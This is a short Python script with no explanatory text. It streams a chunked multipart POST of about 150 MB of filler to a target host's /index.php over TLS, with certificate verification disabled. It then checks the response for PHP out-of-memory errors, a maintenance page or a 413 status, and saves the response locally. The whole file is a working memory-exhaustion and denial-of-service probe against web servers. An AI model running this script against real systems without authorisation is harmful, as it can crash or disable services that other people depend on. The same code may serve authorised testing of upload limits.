import socket, ssl, sys
host=sys.argv[1]; port=int(sys.argv[2]); cap_mb=int(sys.argv[3]) if len(sys.argv)>3 else 150
b='OOMB'
hdr=(f"POST /index.php HTTP/1.1\r\nHost: {host}\r\n"
     f"User-Agent: Mozilla/5.0\r\n"
     f"Content-Type: multipart/form-data; boundary={b}\r\n"
     f"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n").encode()
pre=(f"--{b}\r\nContent-Disposition: form-data; name=\"x\"\r\n\r\n").encode()
raw=socket.create_connection((host,port),timeout=90)
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
s=ctx.wrap_socket(raw,server_hostname=host)
s.sendall(hdr)
def chunk(d): s.sendall(f"{len(d):x}\r\n".encode()+d+b"\r\n")
resp=b""; sent=0; blk=b"A"*65536; target=cap_mb*1024*1024
try:
  chunk(pre)
  while sent<target:
    chunk(blk); sent+=len(blk)
  chunk(f"\r\n--{b}--\r\n".encode()); s.sendall(b"0\r\n\r\n")
except Exception as e:
  print("send ended:",type(e).__name__, sent//1024//1024,"MB")
try:
  s.settimeout(25)
  while True:
    d=s.recv(65536)
    if not d: break
    resp+=d
except Exception as e:
  print("read end:",type(e).__name__)
print("sent MB:",sent//1024//1024)
print("status:",resp.split(b"\r\n",1)[0].decode('latin1','replace') if resp else "(none)")
print("OOM fatal present:", b"Allowed memory size" in resp)
print("is 503 maintenance:", b"Down for maintenance" in resp)
print("413/too large:", b"Request Entity" in resp or b"413" in resp.split(b"\r\n",1)[0])
body=resp.split(b"\r\n\r\n",1)[-1]
open("/tmp/oom_remote_resp.txt","wb").write(resp)
print("body head:",body[:260].decode('latin1','replace'))
